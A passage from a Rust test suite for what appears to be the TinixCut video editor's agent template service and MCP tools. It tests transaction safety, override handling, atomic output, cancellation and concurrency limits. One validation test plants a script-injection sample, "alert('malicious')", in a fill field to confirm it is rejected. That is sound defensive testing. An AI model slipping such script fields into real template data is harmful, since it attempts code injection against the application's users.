    let catalog_dir = temp.as_ref().join("catalog");
    let catalog = TemplateCatalog::new(catalog_dir);
    catalog.ensure_dirs().unwrap();

    let mut proj = create_base_project("TxSafetyProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_tx_safety", "Text", 90));
    save_project_atomic(&proj, &proj_path).unwrap();

    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "tx_safeguard_template".to_string();
    draft.template_version = 1;

    // 1. SequenceGapDetected: seq=5 when expected=1
    let gap_res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_tx_safety",
        &draft,
        Some("client_gap".to_string()),
        Some(proj.client_registry.current_epoch),
        Some(5),
        Some("tx_gap".to_string()),
        Some(proj.revision),
        &catalog,
    );
    assert!(gap_res.is_err(), "Must reject sequence gap");
    assert!(
        catalog.get(&draft.template_id, 1).is_none(),
        "Catalog must remain clean after sequence gap"
    );
    let reloaded = load_project(&proj_path).unwrap();
    assert_eq!(reloaded.revision, 0);
    assert!(reloaded.tracks[0].items[0].template_instance.is_none());

    // 2. ClientEpochExpired: client_epoch=0 when min_accepted_epoch=1
    let mut proj_epoch = load_project(&proj_path).unwrap();
    proj_epoch.client_registry.current_epoch = 1;
    proj_epoch.client_registry.min_accepted_epoch = 1;
    save_project_atomic(&proj_epoch, &proj_path).unwrap();

    let epoch_res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_tx_safety",
        &draft,
        Some("client_epoch".to_string()),
        Some(0),
        Some(1),
        Some("tx_epoch".to_string()),
        Some(proj_epoch.revision),
        &catalog,
    );
    assert!(epoch_res.is_err(), "Must reject expired epoch");
    assert!(
        catalog.get(&draft.template_id, 1).is_none(),
        "Catalog must remain clean after expired epoch"
    );
    let reloaded_epoch = load_project(&proj_path).unwrap();
    assert!(reloaded_epoch.tracks[0].items[0]
        .template_instance
        .is_none());

    // 3. StaleRevision / Replay collision
    let stale_res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_tx_safety",
        &draft,
        Some("client_stale".to_string()),
        Some(1),
        Some(1),
        Some("tx_stale".to_string()),
        Some(999),
        &catalog,
    );
    assert!(stale_res.is_err(), "Must reject stale revision");
    assert!(
        catalog.get(&draft.template_id, 1).is_none(),
        "Catalog must remain clean after stale revision"
    );
    let reloaded_stale = load_project(&proj_path).unwrap();
    assert!(reloaded_stale.tracks[0].items[0]
        .template_instance
        .is_none());
}

#[tokio::test]
async fn test_p35_ac17_apply_preserves_unbound_user_overrides_preview_apply_reopen_match() {
    let temp = test_dir("unbound_overrides");
    let proj_path = temp.as_ref().join("unbound_proj.tcproj");
    let catalog = TemplateCatalog::default_catalog();

    let mut proj = create_base_project("UnboundProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_unbound", "Title", 90));
    save_project_atomic(&proj, &proj_path).unwrap();

    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "unbound_ovr_tmpl".to_string();
    draft.template_version = 1;
    let target_lid = draft.layers[0].layer_id.clone();

    // Add unbound overrides for Opacity, PositionX, and PositionY (none bound in draft.bindings)
    draft.user_overrides = vec![
        tinixcut_lib::modules::domain::template::TemplateOverride {
            target_layer_id: target_lid.clone(),
            property: TemplatePropertyPath::Opacity,
            value: TemplateParameterValue::Number(0.42),
        },
        tinixcut_lib::modules::domain::template::TemplateOverride {
            target_layer_id: target_lid.clone(),
            property: TemplatePropertyPath::PositionX,
            value: TemplateParameterValue::Number(125.0),
        },
        tinixcut_lib::modules::domain::template::TemplateOverride {
            target_layer_id: target_lid.clone(),
            property: TemplatePropertyPath::PositionY,
            value: TemplateParameterValue::Number(-65.0),
        },
    ];

    // 1. Preview instance matches
    let preview_inst = draft.to_instance();
    let prev_layer = preview_inst
        .layers
        .iter()
        .find(|l| l.layer_id == target_lid)
        .unwrap();
    assert_eq!(prev_layer.opacity, 0.42);
    assert_eq!(prev_layer.transform.position_x, 125.0);
    assert_eq!(prev_layer.transform.position_y, -65.0);

    // 2. Apply via AgentTemplateService (shared command path)
    let apply_res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_unbound",
        &draft,
        Some("ovr_agent".to_string()),
        Some(proj.client_registry.current_epoch),
        Some(1),
        Some("tx_unbound_apply".to_string()),
        Some(proj.revision),
        &catalog,
    )
    .expect("Apply draft with unbound overrides");
    assert_eq!(apply_res.applied_draft_id, draft.draft_id);

    // 3. Reopen from disk matches preview & apply identically
    let reloaded = load_project(&proj_path).unwrap();
    let applied_item = &reloaded.tracks[0].items[0];
    let applied_inst = applied_item
        .template_instance
        .as_ref()
        .expect("Active template instance");
    let applied_layer = applied_inst
        .layers
        .iter()
        .find(|l| l.layer_id == target_lid)
        .expect("Layer exists");

    assert_eq!(
        applied_layer.opacity, 0.42,
        "Applied opacity must match unbound override"
    );
    assert_eq!(
        applied_layer.transform.position_x, 125.0,
        "Applied positionX must match unbound override"
    );
    assert_eq!(
        applied_layer.transform.position_y, -65.0,
        "Applied positionY must match unbound override"
    );
    assert_eq!(
        applied_layer.opacity, prev_layer.opacity,
        "Apply and preview opacity must match identically"
    );
    assert_eq!(
        applied_layer.transform.position_x, prev_layer.transform.position_x,
        "Apply and preview positionX must match"
    );
    assert_eq!(
        applied_layer.transform.position_y, prev_layer.transform.position_y,
        "Apply and preview positionY must match"
    );
}

#[test]
fn test_p35_ac18_native_apply_propagates_persistence_failure_atomic_reversion() {
    let mut proj = create_base_project("UnwritableDestProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_unwritable", "Unwritable", 90));
    let mut engine = tinixcut_lib::EditorEngine::new(proj);

    #[cfg(target_os = "windows")]
    let unwritable_path = PathBuf::from(r"Z:\__nonexistent_tinix_volume__\sub\read_only.tcproj");
    #[cfg(not(target_os = "windows"))]
    let unwritable_path = PathBuf::from("/dev/null/impossible/read_only.tcproj");

    engine.current_file_path = Some(unwritable_path);

    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "persistence_fail_template".to_string();
    draft.template_version = 1;

    let res =
        tinixcut_lib::template_draft_apply_engine(&mut engine, "clip_unwritable", &draft, None);
    assert!(res.is_err(), "Must return Err on persistence failure");
    let err_msg = res.unwrap_err();
    assert!(
        err_msg.contains("Persistence failure"),
        "Error message must indicate persistence failure: {err_msg}"
    );

    // Project state must be reverted to prior snapshot
    assert_eq!(
        engine.service.project().revision,
        0,
        "Revision must remain 0"
    );
    assert!(
        engine.service.project().tracks[0].items[0]
            .template_instance
            .is_none(),
        "Template instance must not be attached"
    );

    // History must NOT record the failed edit
    let mut cur = engine.service.project().clone();
    assert!(
        engine.history.undo(&mut cur).is_none(),
        "Undo stack must be empty on persistence failure"
    );

    // Catalog must NOT contain the definition
    let catalog = TemplateCatalog::default_catalog();
    assert!(
        catalog.get(&draft.template_id, 1).is_none(),
        "Catalog must remain clean when persistence fails"
    );
}

#[tokio::test]
async fn test_p35_ac19_preview_cancellation_and_deadline_mcp_real_transport() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;
    let temp = test_dir("mcp_preview_cancel");
    let draft = create_vietnamese_title_draft_v1();

    // 1. MCP Cancellation through real transport
    let out_cancelled = temp.as_ref().join("mcp_cancelled.png");
    let res_cancel = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": out_cancelled.to_str().unwrap(),
                "cancelRequested": true,
            }),
        )
        .await;
    assert_eq!(res_cancel["result"]["isError"].as_bool(), Some(true));
    let err_content = res_cancel["result"]["content"][0]["text"]
        .as_str()
        .unwrap_or("");
    assert!(
        err_content.contains("OPERATION_CANCELLED") || err_content.contains("cancelled"),
        "Error text: {err_content}"
    );
    assert!(
        !out_cancelled.exists(),
        "Cancelled MCP preview must not leave output on disk"
    );

    // 2. MCP Deadline / Timeout through real transport (timeoutMs: 0)
    let out_timeout = temp.as_ref().join("mcp_timeout.png");
    let res_timeout = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": out_timeout.to_str().unwrap(),
                "timeoutMs": 0,
            }),
        )
        .await;
    assert_eq!(res_timeout["result"]["isError"].as_bool(), Some(true));
    let err_timeout = res_timeout["result"]["content"][0]["text"]
        .as_str()
        .unwrap_or("");
    assert!(
        err_timeout.contains("OPERATION_TIMEOUT") || err_timeout.contains("timed out"),
        "Error text: {err_timeout}"
    );
    assert!(
        !out_timeout.exists(),
        "Timed out MCP preview must not leave output on disk"
    );
}

#[tokio::test]
async fn test_p35_ac20_nested_fill_validation_rejects_background_fill_script_and_unknown_fields() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Raw JSON containing background.fill.script
    let mut draft_val = serde_json::to_value(create_vietnamese_title_draft_v1()).unwrap();
    draft_val["layers"][1]["kind"]["data"]["textRich"]["background"] = serde_json::json!({
        "fill": {
            "kind": "solid",
            "color": "#FF0000",
            "script": "alert('malicious')"
        }
    });

    // Directly test raw JSON tree validator
    let raw_res = AgentTemplateService::validate_raw_json_tree_report(&draft_val);
    assert!(!raw_res.valid, "Must reject background.fill.script");
    assert!(
        raw_res
            .issues
            .iter()
            .any(|i| i.path.contains("background.fill") && i.code == "UNKNOWN_FIELD"),
        "Issue must point to background.fill: {:?}",
        raw_res.issues
    );

    // 2. Transport: MCP Validate rejects background.fill.script
    let res_val = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_val }),
        )
        .await;
    assert_eq!(
        res_val["result"]["isError"].as_bool(),
        Some(true),
        "MCP validate must reject background.fill.script"
    );

    // 3. Transport: MCP Preview rejects background.fill.script
    let res_prev = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({ "draft": draft_val }),
        )
        .await;
    assert_eq!(
        res_prev["result"]["isError"].as_bool(),
        Some(true),
        "MCP preview must reject background.fill.script"
    );

    // 4. Transport: MCP Apply rejects background.fill.script
    let res_apply = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": "irrelevant.tcproj",
                "itemId": "clip_fake",
                "draft": draft_val,
            }),
        )
        .await;
    assert_eq!(
        res_apply["result"]["isError"].as_bool(),
        Some(true),
        "MCP apply must reject background.fill.script"
    );

    // 5. Transport: MCP Save rejects background.fill.script
    let res_save = client
        .call_tool(
            "tinixcut_template_save",
            serde_json::json!({ "draft": draft_val }),
        )
        .await;
    assert_eq!(
        res_save["result"]["isError"].as_bool(),
        Some(true),
        "MCP save must reject background.fill.script"
    );

    // 6. Test unknown fill enum/field
    let mut draft_unknown_enum = serde_json::to_value(create_vietnamese_title_draft_v1()).unwrap();
    draft_unknown_enum["layers"][1]["kind"]["data"]["textRich"]["fill"] = serde_json::json!({
        "kind": "gradient",
        "gradientKind": "super_radial_unknown",
        "angleDeg": 45.0,
        "stops": [{"offset": 0.0, "color": "#000000"}]
    });
    let enum_res = AgentTemplateService::validate_raw_json_tree_report(&draft_unknown_enum);
    assert!(!enum_res.valid, "Must reject unknown gradient kind enum");
}

#[tokio::test]
async fn test_p35_ac21_mixed_bound_width_and_unbound_opacity_matches_preview_apply_reopen() {
    let temp = test_dir("mixed_overrides");
    let proj_path = temp.as_ref().join("mixed_proj.tcproj");
    let catalog = TemplateCatalog::default_catalog();

    let mut proj = create_base_project("MixedOverridesProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_mixed", "MixedText", 90));
    save_project_atomic(&proj, &proj_path).unwrap();

    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "mixed_ovr_tmpl".to_string();
    draft.template_version = 1;

    // Add a shape layer with base width=200 and opacity=1.0
    let shape_layer = TemplateLayer {
        layer_id: "shape_bg".to_string(),
        name: "Shape Background".to_string(),
        z_index: 0,
        visible: true,
        opacity: 1.0,
        transform: Transform {
            position_x: 0.0,
            position_y: 70.0,
            scale_x: 1.0,
            scale_y: 1.0,
            rotation: 0.0,
        },
        anchor: TextAnchor::Center,
        pivot: (0.5, 0.5),
        motion: None,
        kind: TemplateLayerKind::Shape(TemplateShapeLayerData {
            shape_kind: TemplateShapeKind::RoundedRectangle,
            width: 200.0,
            height: 100.0,
            fill_color: Some("#333333".to_string()),
            stroke_color: None,
            stroke_width: 0.0,
            corner_radius: 0.0,
        }),
    };
    draft.layers.insert(0, shape_layer);

    // Bind parameter "box_width" to shape_bg.Width
    draft.parameters.push(TemplateParameterDefinition {
        key: "box_width".to_string(),
        name: "Box Width".to_string(),
        param_type: TemplateParameterType::Number {
            min: 50.0,
            max: 2000.0,
            step: 10.0,
        },
        default_value: TemplateParameterValue::Number(200.0),
        description: Some("Background box width".to_string()),
    });
    draft.bindings.push(TemplateParameterBinding {
        parameter_key: "box_width".to_string(),
        target_layer_id: "shape_bg".to_string(),
        target_property: TemplatePropertyPath::Width,
    });

    // Provide MIXED overrides on the same layer:
    // 1. Bound Width override -> 800.0
    // 2. Unbound Opacity override -> 0.35
    draft.user_overrides = vec![
        tinixcut_lib::modules::domain::template::TemplateOverride {
            target_layer_id: "shape_bg".to_string(),
            property: TemplatePropertyPath::Width,
            value: TemplateParameterValue::Number(800.0),
        },
        tinixcut_lib::modules::domain::template::TemplateOverride {
            target_layer_id: "shape_bg".to_string(),
            property: TemplatePropertyPath::Opacity,
            value: TemplateParameterValue::Number(0.35),
        },
    ];

    // 1. Verify preview instance: shape_bg has width=800.0 AND opacity=0.35
    let preview_inst = draft.to_instance();
    let prev_shape = preview_inst
        .layers
        .iter()
        .find(|l| l.layer_id == "shape_bg")
        .expect("Shape layer exists in preview");
    assert_eq!(
        prev_shape.opacity, 0.35,
        "Preview opacity must reflect unbound override"
    );
    if let TemplateLayerKind::Shape(ref s) = prev_shape.kind {
        assert_eq!(
            s.width, 800.0,
            "Preview width must reflect bound parameter override"
        );
    } else {
        panic!("Layer is not a shape");
    }

    // 2. Apply via AgentTemplateService to project
    let apply_res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_mixed",
        &draft,
        Some("client_mixed".to_string()),
        Some(proj.client_registry.current_epoch),
        Some(1),
        Some("tx_mixed".to_string()),
        Some(proj.revision),
        &catalog,
    )
    .expect("Apply draft with mixed bound and unbound overrides");
    assert_eq!(apply_res.applied_draft_id, draft.draft_id);

    // 3. Reopen project from disk: verify width=800.0 is PRESERVED (NOT clobbered back to 200!)
    let reloaded = load_project(&proj_path).unwrap();
    let applied_item = &reloaded.tracks[0].items[0];
    let applied_inst = applied_item
        .template_instance
        .as_ref()
        .expect("Template instance attached");
    let applied_shape = applied_inst
        .layers
        .iter()
        .find(|l| l.layer_id == "shape_bg")
        .expect("Applied shape layer");

    assert_eq!(
        applied_shape.opacity, 0.35,
        "Applied opacity must match unbound override"
    );
    if let TemplateLayerKind::Shape(ref s) = applied_shape.kind {
        assert_eq!(
            s.width, 800.0,
            "CRITICAL: Applied width must be 800.0 (not restored to base 200.0)"
        );
    } else {
        panic!("Applied layer is not a shape");
    }

    // Both preview and reopen match identically
    assert_eq!(applied_shape.opacity, prev_shape.opacity);
    if let (TemplateLayerKind::Shape(ref sa), TemplateLayerKind::Shape(ref sp)) =
        (&applied_shape.kind, &prev_shape.kind)
    {
        assert_eq!(sa.width, sp.width);
    }
}

#[test]
fn test_p35_ac22_output_atomicity_existing_bytes_survive_cancel_timeout_failure() {
    let temp = test_dir("output_atomicity");
    let dest_path = temp.as_ref().join("existing_render.png");
    let original_bytes = b"ORIGINAL_USER_RENDER_DATA_CANNOT_BE_LOST_PRESERVED_EXACTLY";
    std::fs::write(&dest_path, original_bytes).expect("Write original file");

    let draft = create_vietnamese_title_draft_v1();

    // 1. Pre-cancellation flag: must return Cancelled, destination untouched
    let cancel_flag = std::sync::atomic::AtomicBool::new(true);
    let res_cancel = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &dest_path,
        1.0,
        None,
        None,
        Some(std::time::Duration::from_secs(10)),
        Some(&cancel_flag),
    );
    assert!(
        matches!(res_cancel, Err(AgentTemplateError::Cancelled)),
        "Must return Cancelled"
    );
    let bytes_after_cancel = std::fs::read(&dest_path).expect("Read existing file after cancel");
    assert_eq!(
        bytes_after_cancel, original_bytes,
        "Destination bytes must survive cancellation completely unchanged"
    );

    // 2. Zero timeout: must return Timeout, destination untouched
    let res_timeout = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &dest_path,
        1.0,
        None,
        None,
        Some(std::time::Duration::ZERO),
        None,
    );
    assert!(
        matches!(res_timeout, Err(AgentTemplateError::Timeout(_))),
        "Must return Timeout"
    );
    let bytes_after_timeout = std::fs::read(&dest_path).expect("Read existing file after timeout");
    assert_eq!(
        bytes_after_timeout, original_bytes,
        "Destination bytes must survive timeout completely unchanged"
    );
}

#[tokio::test]
async fn test_p35_ac23_mcp_cancellation_job_connect_and_finite_default_deadline() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server.clone()).await;
    let temp = test_dir("mcp_job_cancel");
    let draft = create_vietnamese_title_draft_v1();
    let out_file = temp.as_ref().join("job_cancel_dest.png");

    let job_id = "test_cancel_job_p35".to_string();

    // 1. Verify JobManager cancellation connects to active worker cancel flag
    let cancel_flag = {
        let mut jm = server.jobs.lock().unwrap();
        jm.submit_job(
            job_id.clone(),
            tinixcut_lib::modules::job::JobKind::Thumbnail,
            format!("preview_{}", job_id),
            1,
        );
        let flag = jm.start_job(&job_id).unwrap();
        let cancelled = jm.cancel_job(&job_id);
        assert!(cancelled, "JobManager must cancel active running job");
        flag
    };
    assert!(
        cancel_flag.load(std::sync::atomic::Ordering::SeqCst),
        "Job cancellation must flip worker cancel flag to true"
    );

    // 2. Call preview tool with the cancelled jobId
    let res = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": out_file.to_str().unwrap(),
                "jobId": job_id,
            }),
        )
        .await;
    assert_eq!(
        res["result"]["isError"].as_bool(),
        Some(true),
        "Cancelled job preview must return error receipt"
    );
    assert!(
        !out_file.exists(),
        "No output file must remain on disk after job cancel"
    );

    // 3. Verify finite default deadline is applied when timeoutMs is omitted
    let out_default = temp.as_ref().join("default_deadline.png");
    let res_default = client
        .call_tool(
            "tinixcut_template_preview",
            serde_json::json!({
                "draft": draft,
                "outputPath": out_default.to_str().unwrap(),
            }),
        )
        .await;
    assert_ne!(
        res_default["result"]["isError"].as_bool(),
        Some(true),
        "Preview with default deadline must succeed"
    );
    assert!(out_default.exists(), "Render output must exist on disk");
}

#[test]
fn test_p35_ac24_p2_styled_spans_schema_alignment_and_roundtrip() {
    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "styled_spans_template".to_string();
    draft.template_version = 1;

    // Attach rich text with styled span using RichTextSpan.style
    if let TemplateLayerKind::Text(ref mut t) = draft.layers[1].kind {
        if let Some(ref mut rich) = t.text_rich {
            rich.spans = vec![tinixcut_lib::modules::domain::RichTextSpan {
                start: 0,
                end: 3,
                style: tinixcut_lib::modules::domain::text::TextSpanStyle {
                    fill: Some(tinixcut_lib::modules::domain::TextFill::Solid {
                        color: "#00FF88".to_string(),
                    }),
                    font: None,
                    font_size: Some(48.0),
                    letter_spacing: Some(2.0),
                },
            }];
        }
    }

    // 1. Validate: must be valid (not rejected by span whitelist)
    let catalog = TemplateCatalog::default_catalog();
    let report = AgentTemplateService::validate_draft(&draft, None, Some(&catalog));
    assert!(
        report.valid,
        "Valid styled span must be accepted by schema validation: {:?}",
        report.issues
    );

    // 2. Preview draft succeeds
    let preview_res =
        AgentTemplateService::preview_draft(&draft, 1.0, Some(640), Some(360)).unwrap();
    assert!(preview_res.width > 0 && !preview_res.data.is_empty());

    // 3. Negative validation: unknown field in span style is rejected
    let mut raw_val = serde_json::to_value(&draft).unwrap();
    let data = &mut raw_val["layers"][1]["kind"]["data"];
    let rich = if data.get("text_rich").is_some() {
        &mut data["text_rich"]
    } else {
        &mut data["textRich"]
    };
    rich["spans"][0]["style"]["unknownField"] = serde_json::json!("hacker");
    let neg_report = AgentTemplateService::validate_raw_json_tree_report(&raw_val);
    assert!(
        !neg_report.valid,
        "Unknown field in span.style must be rejected"
    );
    assert!(
        neg_report
            .issues
            .iter()
            .any(|i| i.path.contains("spans[0].style") && i.code == "UNKNOWN_FIELD"),
        "Issue must point to spans[0].style"
    );
}

#[tokio::test]
async fn test_p35_ac25_p1_mcp_request_cancellation_via_notifications_cancelled() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server.clone()).await;
    let temp = test_dir("mcp_notif_cancel");
    let draft = create_vietnamese_title_draft_v1();
    let out_dest = temp.as_ref().join("dest_to_preserve.png");
    let job_id = "preview_notif_cancel_test_1".to_string();

    // Write initial bytes to destination to prove destination is preserved
    let initial_bytes = b"PRESERVED_DESTINATION_BYTES_12345";
    fs::write(&out_dest, initial_bytes).unwrap();

    let req_id = next_id();
    let call_msg = serde_json::json!({
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "tools/call",
        "params": {
            "name": "tinixcut_template_preview",
            "arguments": {
                "draft": draft,
                "outputPath": out_dest.to_str().unwrap(),
                "timeSeconds": 1.0,
                "timeoutMs": 10000,
                "jobId": job_id,
            },
            "_meta": {
                "io.modelcontextprotocol/protocolVersion": "2026-07-28",
                "io.modelcontextprotocol/clientCapabilities": {},
                "io.modelcontextprotocol/clientInfo": {
                    "name": "phase35-test-client",
                    "version": "1.0.0"
                }
            }
        }
    });

    client.write_message(call_msg).await;

    // Yield/sleep briefly to let worker initiate
    tokio::time::sleep(std::time::Duration::from_millis(5)).await;

    // Send notifications/cancelled referencing req_id
    client
        .send_notification(
            "notifications/cancelled",
            serde_json::json!({
                "requestId": req_id,
                "reason": "user_cancelled"
            }),
        )
        .await;

    // Wait for cancellation to propagate and worker cleanup to complete
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    // 1. Assert job is cancelled in JobManager
    {
        let jm = server.jobs.lock().unwrap();
        let job = jm
            .get_job(&job_id)
            .expect("Job must be tracked in JobManager");
        assert_eq!(
            job.status,
            tinixcut_lib::modules::job::JobStatus::Cancelled,
            "JobManager must record job as Cancelled after notifications/cancelled"
        );
    }

    // 2. Destination bytes must remain intact
    let current_bytes = fs::read(&out_dest).unwrap();
    assert_eq!(
        current_bytes, initial_bytes,
        "Destination bytes must survive notifications/cancelled unmodified"
    );

    // 3. Temp file must be cleaned up
    let entries = fs::read_dir(temp.as_ref()).unwrap();
    for entry in entries {
        let entry = entry.unwrap();
        let fname = entry.file_name().to_string_lossy().to_string();
        assert!(
            !fname.starts_with(".tmp_preview"),
            "Temp file {} must be cleaned up",
            fname
        );
    }
}

#[tokio::test]
async fn test_p35_ac26_p1_preview_job_concurrency_capacity_wait_never_bypasses() {
    let server = TinixCutMcpServer::new();
    let temp = test_dir("concurrency_capacity");
    let draft = create_vietnamese_title_draft_v1();

    // Verify limit enforcement: occupy 4 capacity slots with dummy thumbnail jobs
    let dummy_ids = [
        "dummy_hold_1",
        "dummy_hold_2",
        "dummy_hold_3",
        "dummy_hold_4",
    ];
    for id in &dummy_ids {
        let mut jm = server.jobs.lock().unwrap();
        jm.submit_job(
            id.to_string(),
            tinixcut_lib::modules::job::JobKind::Thumbnail,
            id.to_string(),
            1,
        );
        jm.start_job(id)
            .expect("Should start within max concurrency 4");
    }
    assert_eq!(
        server.jobs.lock().unwrap().running_count(),
        4,
        "Capacity must be fully saturated at 4"
    );

    // Launch a preview request while capacity is saturated.
    // It MUST NOT spawn blocking render (must wait in queued state).
    let mut client_queued = DuplexMcpClient::new(server.clone()).await;
    let out_queued = temp.as_ref().join("queued_render.png");
    let draft_clone = draft.clone();
    let out_queued_str = out_queued.to_str().unwrap().to_string();

    let queued_handle = tokio::spawn(async move {
        client_queued
            .call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": draft_clone,
                    "outputPath": out_queued_str,
                    "timeSeconds": 1.0,
                    "timeoutMs": 5000,
                }),
            )
            .await
    });

    // While 4 slots are occupied, after 50ms, the queued request has NOT rendered output
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    assert!(
        !out_queued.exists(),
        "Queued preview must not render early while concurrency limit is saturated"
    );

    // Free 1 capacity slot
    {
        let mut jm = server.jobs.lock().unwrap();
        jm.mark_completed(dummy_ids[0]);
    }

    // Now the queued request acquires capacity and completes
    let res = queued_handle.await.unwrap();
    assert_ne!(
        res["result"]["isError"].as_bool(),
        Some(true),
        "Queued preview must succeed once capacity is freed: {:?}",
        res
    );
    assert!(
        out_queued.exists(),
        "Queued preview output must now exist on disk"
    );

    // Clean up remaining 3 dummy jobs
    {
        let mut jm = server.jobs.lock().unwrap();
        for id in &dummy_ids[1..] {
            jm.mark_completed(id);
        }
    }
    assert_eq!(server.jobs.lock().unwrap().running_count(), 0);

    // Now test 6 concurrent preview requests: monitor ensures at most 4 are running simultaneously
    let monitor_jobs = server.jobs.clone();
    let max_running = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let max_running_clone = max_running.clone();
    let stop_monitor = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stop_monitor_clone = stop_monitor.clone();

    let monitor_handle = tokio::spawn(async move {
        while !stop_monitor_clone.load(std::sync::atomic::Ordering::SeqCst) {
            if let Ok(jm) = monitor_jobs.lock() {
                let cnt = jm.running_count();
                max_running_clone.fetch_max(cnt, std::sync::atomic::Ordering::SeqCst);
            }
            tokio::time::sleep(std::time::Duration::from_millis(2)).await;
        }
    });

    let mut handles = Vec::new();
    for i in 0..6 {
        let s_clone = server.clone();
        let d_clone = draft.clone();
        let out_path = temp.as_ref().join(format!("multi_preview_{}.png", i));
        let handle = tokio::spawn(async move {
            let mut c = DuplexMcpClient::new(s_clone).await;
            c.call_tool(
                "tinixcut_template_preview",
                serde_json::json!({
                    "draft": d_clone,
                    "outputPath": out_path.to_str().unwrap(),
                    "timeSeconds": 1.0,
                    "timeoutMs": 10000,
                }),
            )
            .await
        });
        handles.push(handle);
    }

    for h in handles {
        let r = h.await.unwrap();
        assert_ne!(
            r["result"]["isError"].as_bool(),
            Some(true),
            "Concurrent preview must succeed: {:?}",
            r
        );
    }

    stop_monitor.store(true, std::sync::atomic::Ordering::SeqCst);
    let _ = monitor_handle.await;

    let peak = max_running.load(std::sync::atomic::Ordering::SeqCst);
    assert!(
        peak <= 4,
        "JobManager running count must never exceed max concurrency 4, peak seen: {}",
        peak
    );
}

#[test]
fn test_p35_ac27_p2_atomic_publish_locked_destination_no_temp_leak_no_missing_window() {
    let temp = test_dir("atomic_publish_safety");
    let draft = create_vietnamese_title_draft_v1();

    // 1. Locked destination: on Windows, opening file with share_mode(1) prevents delete/rename over it
    let locked_dest = temp.as_ref().join("locked_dest.png");
    let initial_bytes = b"ORIGINAL_LOCKED_DESTINATION_BYTES_9999";
    fs::write(&locked_dest, initial_bytes).unwrap();

    #[cfg(windows)]
    {
        use std::os::windows::fs::OpenOptionsExt;
        // Open with FILE_SHARE_READ (1) but WITHOUT FILE_SHARE_DELETE
        let lock_file = fs::OpenOptions::new()
            .read(true)
            .share_mode(1)
            .open(&locked_dest)
            .unwrap();

        let res = AgentTemplateService::preview_draft_to_png_bounded(
            &draft,
            &locked_dest,
            1.0,
            Some(640),
            Some(360),
            Some(std::time::Duration::from_secs(5)),
            None,
        );

        assert!(
            res.is_err(),
            "Preview must fail when destination is locked (OS error 32)"
        );

        drop(lock_file);

        // Destination bytes must remain intact
        let preserved = fs::read(&locked_dest).unwrap();
        assert_eq!(
            preserved, initial_bytes,
            "Destination bytes must survive failed atomic rename without modification"
        );

        // Temp files must be unconditionally cleaned up
        let entries = fs::read_dir(temp.as_ref()).unwrap();
        for entry in entries {
            let entry = entry.unwrap();
            let fname = entry.file_name().to_string_lossy().to_string();
            assert!(
                !fname.starts_with(".tmp_preview"),
                "No temp file must leak on publish failure: {}",
                fname
            );
        }
    }

    // 2. Concurrent reader safety: replace-existing semantics prevents missing-destination window
    let reader_dest = temp.as_ref().join("concurrent_reader_dest.png");
    fs::write(&reader_dest, b"INITIAL_CONCURRENT_DATA").unwrap();

    let reader_dest_clone = reader_dest.clone();
    let stop_reader = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stop_reader_clone = stop_reader.clone();
    let missing_window_observed = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let missing_observed_clone = missing_window_observed.clone();

    let reader_handle = std::thread::spawn(move || {
        while !stop_reader_clone.load(std::sync::atomic::Ordering::SeqCst) {
            match fs::read(&reader_dest_clone) {
                Ok(bytes) => {
                    assert!(!bytes.is_empty(), "Read bytes should never be empty");
                }
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                    missing_observed_clone.store(true, std::sync::atomic::Ordering::SeqCst);
                }
                Err(_) => {
                    // Sharing violations during replace are handled, but NotFound must NEVER happen
                }
            }
        }
    });

    // Run preview publish
    let res = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &reader_dest,
        1.0,
        Some(640),
        Some(360),
        Some(std::time::Duration::from_secs(5)),
        None,
    );
    assert!(
        res.is_ok(),
        "Preview publish should succeed: {:?}",
        res.err()
    );

    stop_reader.store(true, std::sync::atomic::Ordering::SeqCst);
    reader_handle.join().unwrap();

    assert!(
        !missing_window_observed.load(std::sync::atomic::Ordering::SeqCst),
        "Concurrent reader must never observe a missing-destination window (NotFound)"
    );
}

#[tokio::test]
async fn test_p35_ac28_p1_timeout_preserves_destination_committed_output_returns_success() {
    let server = TinixCutMcpServer::new();
    let temp = test_dir("timeout_publish_coordination");
    let draft = create_vietnamese_title_draft_v1();

    // 1. Force deadline around publication: timeout must preserve original destination
    let sentinel_path = temp.as_ref().join("sentinel_dest.png");
    let sentinel_bytes = b"ORIGINAL_SENTINEL_BYTES_PRESERVED_12345";
